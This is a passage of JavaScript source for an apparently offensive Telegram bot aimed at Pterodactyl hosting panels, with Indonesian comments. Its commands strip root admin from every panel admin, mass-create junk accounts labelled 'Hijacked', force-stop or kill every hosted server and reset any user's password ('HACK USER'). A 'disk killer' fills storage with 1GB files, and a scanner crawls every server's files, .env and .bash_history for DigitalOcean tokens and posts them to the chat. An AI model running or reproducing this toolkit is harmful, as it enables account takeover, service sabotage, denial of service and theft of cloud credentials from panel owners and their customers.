        await ctx.reply(`🛡️ *SKIP EXCLUDED:* ${uName} [ID: ${uId}]`, { parse_mode: 'Markdown' });
        continue;
      }

      processed++;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>👑 RESET ADMIN - DOWNGRADE ALL 👑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${processed}/${totalAdmins - skippedExcluded}
⏰ Waktu: ${date}
${excludedIds.length > 0 ? `🛡️ Exclude ID: ${excludedIds.join(', ')}` : '🛡️ Exclude: Tidak ada'}
━━━━━━━━━━━━━━━━━━━━
👤 User: ${uName} [ID: ${uId}]
📧 Email: ${uEmail}
📊 Status: ⏳ Menurunkan pangkat...
    `,
        { parse_mode: "HTML" }
      );

      try {
        await axios.patch(`${host}/api/application/users/${uId}`, {
          "username": uData.username,
          "email": uData.email,
          "first_name": uData.first_name,
          "last_name": uData.last_name,
          "root_admin": false // DOWNGRADE!
        }, {
          headers: {
            'Authorization': `Bearer ${PTERO_PLTA}`,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          timeout: 10000
        });

        successDowngrade++;

        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>👑 RESET ADMIN - DOWNGRADE ALL 👑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${processed}/${totalAdmins - skippedExcluded}
⏰ Waktu: ${date}
${excludedIds.length > 0 ? `🛡️ Exclude ID: ${excludedIds.join(', ')}` : '🛡️ Exclude: Tidak ada'}
━━━━━━━━━━━━━━━━━━━━
👤 User: ${uName} [ID: ${uId}]
📊 Status: ✅ DOWNGRADED!
    `,
          { parse_mode: "HTML" }
        );

      } catch (err) {
        failedDowngrade++;
        await ctx.reply(`❌ *GAGAL DOWNGRADE!*\n👤 ${uName} [ID: ${uId}]\n⚠️ ${err.response?.status || err.message}`, { parse_mode: 'Markdown' });
      }

      await sleep(500);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ RESET ADMIN COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
👑 Total Admin: ${totalAdmins}
🛡️ Excluded: ${skippedExcluded}
✅ Success Downgrade: ${successDowngrade}
❌ Failed: ${failedDowngrade}
🔥 Status: ALL ADMIN DOWNGRADED!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR RESET ADMIN ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END RESET ADMIN ======

// ====== SPAM USER (MASS CREATE USER) ======
bot.command("spam", checkCmd("spam"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN dan PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  // PARSE ARGUMEN: /spam jumlah|nama|domain
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Example: \`/spam 10|test|gmail.com\`\n` +
      `Example: \`/spam 5|hacker|yahoo.com\`\n\n` +
      `📝 *Keterangan:*\n` +
      `• jumlah: berapa user yang mau dibuat\n` +
      `• nama: prefix username\n` +
      `• domain: domain email (opsional, default gmail.com)`,
      { parse_mode: 'Markdown' }
    );
  }

  const input = args[1];
  const parts = input.split('|');
  
  if (parts.length < 2) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Gunakan format: \`jumlah|nama|domain\`\n` +
      `Example: \`/spam 10|test|gmail.com\``,
      { parse_mode: 'Markdown' }
    );
  }

  const jumlah = parseInt(parts[0]);
  const nama = parts[1];
  const finalDomain = parts[2] || "gmail.com";

  if (isNaN(jumlah) || jumlah < 1) {
    return ctx.reply("❌ *Jumlah harus angka positif!*", { parse_mode: 'Markdown' });
  }

  if (jumlah > 100) {
    return ctx.reply("⚠️ *Maksimal 100 user per spam!*", { parse_mode: 'Markdown' });
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  const headers = {
    'Authorization': `Bearer ${PTERO_PLTA}`,
    'Content-Type': 'application/json',
    'Accept': 'application/json'
  };

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🔥 SPAM USER - MASS CREATE 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Memulai spam user...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
📝 Jumlah: ${jumlah}
👤 Prefix: ${nama}
📧 Domain: ${finalDomain}
🔄 Membuat user...
    `,
    parse_mode: "HTML"
  });

  let successCount = 0;
  let failCount = 0;
  let createdUsers = [];

  try {
    for (let i = 1; i <= jumlah; i++) {
      const randomNum = Math.floor(Math.random() * 9999);
      const uName = `${nama}${randomNum}${i}`;
      const email = `${uName}@${finalDomain}`;
      const password = `Password${randomNum}${i}!`;

      // UPDATE PROGRESS
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🔥 SPAM USER - MASS CREATE 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i}/${jumlah}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
📝 Jumlah: ${jumlah}
👤 Prefix: ${nama}
📧 Domain: ${finalDomain}
━━━━━━━━━━━━━━━━━━━━
🔄 Creating: ${uName}@${finalDomain}
✅ Success: ${successCount}
❌ Failed: ${failCount}
    `,
        { parse_mode: "HTML" }
      );

      try {
        await axios.post(`${host}/api/application/users`, {
          "username": uName,
          "email": email,
          "first_name": uName,
          "last_name": "Hijacked",
          "password": password
        }, { headers, timeout: 10000 });

        successCount++;
        createdUsers.push(`✅ ${uName}@${finalDomain} | Pass: ${password}`);

        // KIRIM NOTIF PER USER (tapi jangan terlalu spam)
        if (i % 5 === 0 || i === jumlah) {
          await ctx.reply(`✅ *User Created!*\n👤 ${uName}\n📧 ${email}\n🔑 ${password}`, { parse_mode: 'Markdown' });
        }

      } catch (err) {
        failCount++;
        const errorMsg = err.response?.data?.errors?.[0]?.detail || err.message;
        createdUsers.push(`❌ ${uName}@${finalDomain} | Error: ${errorMsg}`);
      }

      await sleep(300);
    }

    // 3. SELESAI
    let resultSummary = createdUsers.slice(0, 10).join('\n');
    if (createdUsers.length > 10) {
      resultSummary += `\n... dan ${createdUsers.length - 10} user lainnya`;
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ SPAM USER COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
📝 Total Request: ${jumlah}
✅ Success: ${successCount}
❌ Failed: ${failCount}
📧 Domain: @${finalDomain}
🔥 Status: DONE!

📋 *Daftar User (10 teratas):*
${resultSummary}
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR SPAM USER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END SPAM USER ======

// ====== SHUTDOWN ALL SERVERS ======
bot.command("shutdown", checkCmd("shutdown"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTC) {
    return ctx.reply("❌ *PLTC TOKEN NOT SET!*\n\nSet PTERO_PLTC di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Mengambil daftar server...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari semua server di panel...
    `,
    parse_mode: "HTML"
  });

  let totalServers = 0;
  let stoppedServers = 0;
  let killedServers = 0;
  let failedServers = 0;

  try {
    // 1. FETCH SERVERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Mengambil data server...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const res = await axios.get(`${host}/api/application/servers`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const servers = res.data.data || [];
    totalServers = servers.length;

    if (totalServers === 0) {
      return ctx.reply("❌ *TIDAK ADA SERVER DITEMUKAN!*", { parse_mode: 'Markdown' });
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalServers} Servers
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🛑 Mematikan semua server...
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA SERVER
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const sName = server.attributes.name;
      const sUUID = server.attributes.identifier; // identifier buat client API

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} [${sUUID}]
📊 Status: ⏳ Mengirim stop signal...
    `,
        { parse_mode: "HTML" }
      );

      try {
        // ATTEMPT 1: STOP
        await axios.post(`${host}/api/client/servers/${sUUID}/power`, 
          { "signal": "stop" }, 
          {
            headers: {
              'Authorization': `Bearer ${PTERO_PLTC}`,
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            timeout: 10000
          }
        );

        stoppedServers++;

        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} [${sUUID}]
📊 Status: ✅ STOPPED!
    `,
          { parse_mode: "HTML" }
        );

      } catch (err) {
        // ATTEMPT 2: KILL (paksa mati)
        try {
          await axios.post(`${host}/api/client/servers/${sUUID}/power`, 
            { "signal": "kill" }, 
            {
              headers: {
                'Authorization': `Bearer ${PTERO_PLTC}`,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
              },
              timeout: 10000
            }
          );

          killedServers++;

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
            `
<blockquote>🛑 MASS SHUTDOWN - ALL SERVERS 🛑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} [${sUUID}]
📊 Status: 💀 KILLED!
    `,
            { parse_mode: "HTML" }
          );

        } catch (killErr) {
          failedServers++;
          await ctx.reply(`❌ *GAGAL SHUTDOWN!*\n🖥️ ${sName} [${sUUID}]\n⚠️ ${killErr.response?.status || killErr.message}`, { parse_mode: 'Markdown' });
        }
      }

      await sleep(500);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ MASS SHUTDOWN COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Server: ${totalServers}
✅ Stopped: ${stoppedServers}
💀 Killed: ${killedServers}
❌ Failed: ${failedServers}
🔥 Status: ALL SERVERS DOWN!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR MASS SHUTDOWN ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END SHUTDOWN ======

// ====== PASSWORD CHANGER (HACK USER) ======
bot.command("passwd", checkCmd("passwd"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN dan PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  // PARSE ARGUMEN: /passwd user_id password_baru
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply(
      `❌ *Format Salah!*\n\n` +
      `Example: \`/passwd 12345 PasswordBaru123!\`\n` +
      `Example: \`/passwd 69 AdminHack@123\`\n\n` +
      `📝 *Keterangan:*\n` +
      `• user_id: ID user target (bisa admin)\n` +
      `• password_baru: password baru yang mau di-set`,
      { parse_mode: 'Markdown' }
    );
  }

  const targetId = args[1];
  const newPass = args.slice(2).join(" "); // Support password dengan spasi

  if (targetId === "6912454493") {
    return ctx.reply("❌ *TIDAK BISA!* Ini adalah ID OWNER bot, jangan rusak akses sendiri 😈", { parse_mode: 'Markdown' });
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🔑 PASSWORD CHANGER - BYPASS 🔑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Mengambil data user...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🎯 Target ID: ${targetId}
🔑 New Password: ********
    `,
    parse_mode: "HTML"
  });

  try {
    // 1. GET USER DATA
    const userRes = await axios.get(`${host}/api/application/users/${targetId}`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const u = userRes.data.attributes;
    const isAdmin = u.root_admin ? "✅ ADMIN" : "❌ User Biasa";

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🔑 PASSWORD CHANGER - BYPASS 🔑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Data ditemukan!
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
👤 Username: ${u.username}
📧 Email: ${u.email}
🆔 ID: ${targetId}
👑 Role: ${isAdmin}
━━━━━━━━━━━━━━━━━━━━
🔄 Mengganti password...
    `,
      { parse_mode: "HTML" }
    );

    // 2. CHANGE PASSWORD
    await axios.patch(`${host}/api/application/users/${targetId}`, {
      email: u.email,
      username: u.username,
      first_name: u.first_name,
      last_name: u.last_name,
      password: newPass
    }, {
      headers: {
        'Authorization': `Bearer ${PTERO_PLTA}`,
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      timeout: 10000
    });

    // 3. SUCCESS
    const resultMsg = `
<blockquote>✅ PASSWORD CHANGED SUCCESSFULLY ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
👤 Username: ${u.username}
📧 Email: ${u.email}
🆔 ID: ${targetId}
👑 Role: ${isAdmin}
🔑 New Password: \`${newPass}\`
━━━━━━━━━━━━━━━━━━━━
🔥 BYPASSED BY @RanggaCloudCS
    `;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      resultMsg,
      { parse_mode: "HTML" }
    );

    // KIRIM NOTIF KE CHAT (dengan password)
    await ctx.reply(
      `✅ *PASSWORD CHANGED!*\n\n` +
      `👤 **Username:** ${u.username}\n` +
      `📧 **Email:** ${u.email}\n` +
      `🆔 **ID:** ${targetId}\n` +
      `🔑 **New Password:** \`${newPass}\`\n` +
      `👑 **Role:** ${isAdmin}`,
      { parse_mode: 'Markdown' }
    );

  } catch (err) {
    let errorMsg = err.message;
    if (err.response) {
      const detail = err.response.data?.errors?.[0]?.detail || JSON.stringify(err.response.data);
      errorMsg = detail;
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ PASSWORD CHANGE FAILED ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🎯 Target ID: ${targetId}
⚠️ ERROR: ${errorMsg}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END PASSWORD CHANGER ======

// ====== DISK KILLER (FILL STORAGE) ======
bot.command("kill", checkCmd("kill"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK APAKAH ADA ARGUMEN UNTUK STOP
  const args = ctx.message.text.split(" ");
  if (args.length > 1 && args[1].toLowerCase() === "stop") {
    // STOP KILL PROCESS
    try {
      const killPid = execSync("pgrep -f 'dd if=/dev/zero'", { encoding: 'utf8' }).trim();
      if (killPid) {
        execSync(`kill -9 ${killPid} 2>/dev/null || true`);
        // HAPUS FILE SAMPLE
        execSync(`rm -rf ./killer/* 2>/dev/null || true`);
        await ctx.reply("🛑 *DISK KILLER STOPPED!*\n\n✅ Semua proses dihentikan\n🗑️ File sampah dihapus", { parse_mode: 'Markdown' });
      } else {
        await ctx.reply("❌ *TIDAK ADA PROSES KILLER YANG BERJALAN!*", { parse_mode: 'Markdown' });
      }
    } catch (err) {
      await ctx.reply(`❌ *GAGAL STOP KILLER!*\n⚠️ ${err.message}`, { parse_mode: 'Markdown' });
    }
    return;
  }

  // CEK FOLDER KILLER
  const killerFolder = './killer';
  if (!fs.existsSync(killerFolder)) {
    fs.mkdirSync(killerFolder, { recursive: true });
  }

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>💀 DISK KILLER - STORAGE FILLER 💀</blockquote>
👤 User: ${username}
📊 Status: ⏳ Memulai disk killer...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mengisi storage dengan file sampah...
⚠️ Proses akan berjalan sampai disk penuh!
    `,
    parse_mode: "HTML"
  });

  let fileCount = 0;
  let isRunning = true;

  // FUNGSI CEK DISK
  function getDiskStats() {
    try {
      const stdout = execSync("df / | tail -1").toString().trim();
      const parts = stdout.split(/\s+/);
      const total = parseInt(parts[1]);
      const used = parseInt(parts[2]);
      const percent = ((used / total) * 100).toFixed(1);
      const humanUsed = (used / 1024 / 1024).toFixed(2);
      const humanTotal = (total / 1024 / 1024).toFixed(2);
      return { percent, humanUsed, humanTotal };
    } catch (e) {
      return { percent: "0", humanUsed: "0", humanTotal: "0" };
    }
  }

  try {
    while (isRunning) {
      const stats = getDiskStats();

      // UPDATE PROGRESS
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>💀 DISK KILLER - STORAGE FILLER 💀</blockquote>
👤 User: ${username}
📊 Status: ⏳ Running...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
💾 Disk Usage: ${stats.percent}%
📦 Used: ${stats.humanUsed}GB / ${stats.humanTotal}GB
📄 File Created: ${fileCount}
📁 File: payload_${fileCount}.bin
━━━━━━━━━━━━━━━━━━━━
⚠️ Proses berjalan di background...
🛑 Untuk stop: /kill stop
    `,
        { parse_mode: "HTML" }
      );

      // CEK APAKAH DISK SUDAH FULL
      if (parseFloat(stats.percent) >= 100) {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>✅ DISK KILLER COMPLETE ✅</blockquote>
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
💾 Disk Usage: 100% FULL!
📦 Total Used: ${stats.humanUsed}GB
📄 Total Files: ${fileCount}
🔥 Status: STORAGE FULL!
🛑 Stop: /kill stop
    `,
          { parse_mode: "HTML" }
        );
        break;
      }

      // BUAT FILE SAMPLE 1GB
      try {
        execSync(`dd if=/dev/zero of=${killerFolder}/payload_${fileCount}.bin bs=1M count=1024 status=none 2>/dev/null`);
        fileCount++;
      } catch (err) {
        // DISK UDAH FULL ATAU GAGAL WRITE
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>⚠️ DISK KILLER STOPPED ⚠️</blockquote>
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
💾 Disk Usage: ${stats.percent}%
📄 Files Created: ${fileCount}
⚠️ ERROR: ${err.message}
🛑 Stop: /kill stop
    `,
          { parse_mode: "HTML" }
        );
        break;
      }

      // DELAY BIAR GAK OVERLOAD
      await sleep(500);
    }

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ DISK KILLER ERROR ❌</blockquote>
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
🛑 Stop: /kill stop
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END DISK KILLER ======

// ====== DO TOKEN LEAK SCANNER ======
bot.command("apido", checkCmd("apido"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTC) {
    return ctx.reply("❌ *PLTC TOKEN NOT SET!*\n\nSet PTERO_PLTC di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  const chatId = ctx.chat.id.toString();

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🌊 DO TOKEN LEAK SCANNER 🌊</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Memulai scan token...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔍 Mencari DigitalOcean Token di semua server...
    `,
    parse_mode: "HTML"
  });

  let totalServers = 0;
  let totalFilesScanned = 0;
  let totalTokensFound = 0;

  // FUNGSI SCAN FILE CONTENT
  async function scanFileContent(sID, sName, fPath) {
    try {
      const contentRes = await axios.get(`${host}/api/client/servers/${sID}/files/contents?file=%2F${encodeURIComponent(fPath)}`, {
        headers: { 
          'Authorization': `Bearer ${PTERO_PLTC}`, 
          'Accept': 'application/json' 
        },
        timeout: 10000
      });

      const content = contentRes.data;

      // REGEX: Mencari pola DigitalOcean Token (dop_v1_...)
      const doRegex = /dop_v1_[a-zA-Z0-9]+/g;
      const foundDo = content.match(doRegex) || [];

      if (foundDo.length > 0) {
        const uniqueTokens = [...new Set(foundDo)];
        totalTokensFound += uniqueTokens.length;

        let message = `🌊 **DIGITALOCEAN APIKEY DETECTED** 🌊\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🖥️ **SERVER** : \`${sName}\`\n`;
        message += `🆔 **ID** : \`${sID}\`\n`;
        message += `📂 **FILE** : \`${fPath}\`\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        message += `🔑 **DO TOKENS:**\n`;

        uniqueTokens.forEach(t => {
          message += `\`${t}\`\n`;
        });

        // KIRIM KE CHAT
        await ctx.reply(message, { parse_mode: 'Markdown' });

        // NOTIF KE BOT
        await ctx.telegram.sendMessage(chatId, 
          `✅ **TOKEN FOUND!**\n🖥️ ${sName}\n📂 ${fPath}\n🔑 ${uniqueTokens.length} token(s)`,
          { parse_mode: 'Markdown' }
        );

        console.log(`[DO SCAN] Found ${uniqueTokens.length} tokens in ${sName}: ${fPath}`);
      }

      return foundDo.length;

    } catch (e) {
      // Skip file jika error (terlalu besar atau dilarang)
      return 0;
    }
  }

  // FUNGSI DEEP SCAN
  async function deepScan(sID, sName, dir = '') {
    try {
      const encodedDir = encodeURIComponent(dir || '/');
      const filesRes = await axios.get(`${host}/api/client/servers/${sID}/files/list?directory=${encodedDir}`, {
        headers: { 
          'Authorization': `Bearer ${PTERO_PLTC}`, 
          'Accept': 'application/json' 
        },
        timeout: 8000
      });

      const files = filesRes.data.data || [];

      for (const file of files) {
        const fName = file.attributes.name;
        const isDir = file.attributes.mimetype === 'application/x-directory' || !fName.includes('.');
        const fPath = dir ? `${dir}/${fName}` : fName;

        if (isDir) {
          if (!['node_modules', '.npm', '.git'].includes(fName)) {
            await deepScan(sID, sName, fPath);
          }
        } else {
          // Scan semua file teks/config yang mencurigakan
          const targetFiles = ['.env', 'config.js', 'settings.js', 'production.json', 'app.json', '.bash_history', 'credentials.json'];
          if (targetFiles.includes(fName) || fName.endsWith('.js') || fName.endsWith('.json') || fName.endsWith('.txt')) {
            totalFilesScanned++;
            const found = await scanFileContent(sID, sName, fPath);
            
            // UPDATE PROGRESS SETIAP 10 FILE
            if (totalFilesScanned % 10 === 0) {
              await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                msg.message_id,
                null,
                `
<blockquote>🌊 DO TOKEN LEAK SCANNER 🌊</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 🔍 Scanning...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName}
📂 File: ${fPath}
📄 Files Scanned: ${totalFilesScanned}
🔑 Tokens Found: ${totalTokensFound}
    `,
                { parse_mode: "HTML" }
              );
            }
          }
        }
      }
    } catch (e) {
      // Silent skip
    }
  }

  try {
    // 1. FETCH SERVERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🌊 DO TOKEN LEAK SCANNER 🌊</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Fetching Servers...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const serversRes = await axios.get(`${host}/api/application/servers`, {
      headers: {
        'Authorization': `Bearer ${PTERO_PLTA}`,
        'Accept': 'application/json'
      },
      timeout: 10000
    });

    const servers = serversRes.data.data || [];
    totalServers = servers.length;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🌊 DO TOKEN LEAK SCANNER 🌊</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalServers} Servers
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Scanning ${totalServers} server...
🔍 Mencari DO token di semua file
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA SERVER
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const sID = server.attributes.identifier;
      const sName = server.attributes.name;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🌊 DO TOKEN LEAK SCANNER 🌊</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
